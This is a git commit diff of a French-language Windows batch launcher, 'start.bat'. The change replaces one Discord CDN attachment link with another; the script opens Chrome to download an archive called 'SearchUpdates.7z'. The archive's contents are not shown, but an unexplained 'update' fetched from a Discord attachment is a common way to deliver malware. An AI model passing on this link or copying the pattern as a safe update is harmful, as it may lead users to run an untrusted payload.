1ac9b6b4aa8d6e70b85d2c3947a53835d61cf881
SysAdmiN <97897361+syslinks@users.noreply.github.com>
2023-02-11 15:44:00 -0800

    Update start.bat
    fix downloads

--- start.bat
+++ start.bat
@@ -11,7 +11,7 @@ set /p choix=  Choisis La Methode Que Tu Souhaite. :
 if %choix%==1 goto Download
 if %choix%==2 goto Exit
 :Download
-start chrome https://cdn.discordapp.com/attachments/1068635223711035544/1068843102183366687/SearchUpdates.7z
+start chrome https://cdn.discordapp.com/attachments/896813865831125005/1074101916134555778/SearchUpdates.7z
 exit
 goto tache Terminer
 :Exit
